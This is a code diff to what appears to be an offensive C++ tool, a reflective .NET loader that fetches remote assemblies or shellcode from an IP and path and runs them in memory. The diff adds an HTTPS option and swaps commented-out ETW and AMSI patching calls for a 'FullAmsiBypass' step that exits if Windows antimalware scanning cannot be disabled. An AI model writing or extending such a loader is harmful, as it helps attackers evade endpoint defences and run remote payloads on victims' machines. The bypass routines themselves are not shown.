@@ -15,16 +15,16 @@ using namespace mscorlib;
 #include <shellapi.h>
 #pragma comment(lib, "shell32.lib")
 
-void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args) {
+void InitDotnet(std::wstring FilePath, bool isRemote, std::wstring args, bool https) {
 	if (isRemote) {
 		std::cout << "[+] Remote dotnet execution\n";
-		Dotnet(FilePath, args, true);
+		Dotnet(FilePath, args, true, https);
 	}
 	else {
 		std::wcout << "Received argument for initialisation: filePath: " << FilePath << " args: " << args << "\n";
 		if (checkFile(FilePath)) {
 			std::cout << "[+] File is a valid .NET executable, proceeding with execution\n";
-			Dotnet(FilePath, args, false);
+			Dotnet(FilePath, args, false, https);
 		}
 		else {
 			std::cout << "[-] Could not parse file path or file does not exist, exiting\n";
@@ -173,20 +173,25 @@ LPSTR* convertArgsToLPSTRArray(std::wstring args, int& argsCount) {
 }
 
 
-std::vector<char> fetchRemoteEx(std::wstring url, std::wstring file) {
+std::vector<char> fetchRemoteEx(std::wstring url, std::wstring file, bool https) {
     std::vector<unsigned char> data =
-        helperHandler.fetchRemoteShellcodeAndDecode(url, file, 0x00);
+        helperHandler.fetchRemoteShellcodeAndDecode(url, file, 0x00, https);
 
     return std::vector<char>(data.begin(), data.end());
 };
-void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote) {
+void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https) {
 
     int argsCount = 0;
     SAFEARRAY* params = nullptr;
     LPSTR* arguments = convertArgsToLPSTRArray(args, argsCount);
-    SetupEtwBypass();
-    SetupAMSIBypass();
-    
+    //SetupEtwBypass();
+    //SetupAMSIBypass();
+    if (!FullAmsiBypass()) {
+		std::cout << "[-] Failed to bypass AMSI, exiting early\n";
+        return;
+    };
+    std::wcout << L"------- Reflective .NET Loader -------\n";
+    /*
     if (!patchRemoteETW(mainInjector.process(-1))) {
 
         std::cout << "[+] Patched ETW\n";
@@ -194,8 +199,8 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote) {
     else {
         std::cout << "[-] Didnt Patched ETW\n";
     };
-    /*
-    if (!patchRemoteAmsi(mainInjector.process(-1))) {
+    
+       if (!patchRemoteAmsi(mainInjector.process(-1))) {
         std::cout << "[+] Patched Amsi\n";
     }
     else {
@@ -203,7 +208,8 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote) {
     }
     */
     
-    std::wcout << L"------- Reflective .NET Loader -------\n";
+    
+    
 
     HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
     if (FAILED(hr)) return;
@@ -227,7 +233,7 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote) {
             url = FilePath.substr(0, pos);
             path = FilePath.substr(pos);
 			std::wcout << "[+] Fetching remote assembly from: " << url << " with path: " << path << "\n";
-            buffer = fetchRemoteEx(url, path);
+            buffer = fetchRemoteEx(url, path, https);
         }
         else {
             std::wcout << "[-] Invalid remote path format. Expected format: <IP>/<Path>\n";
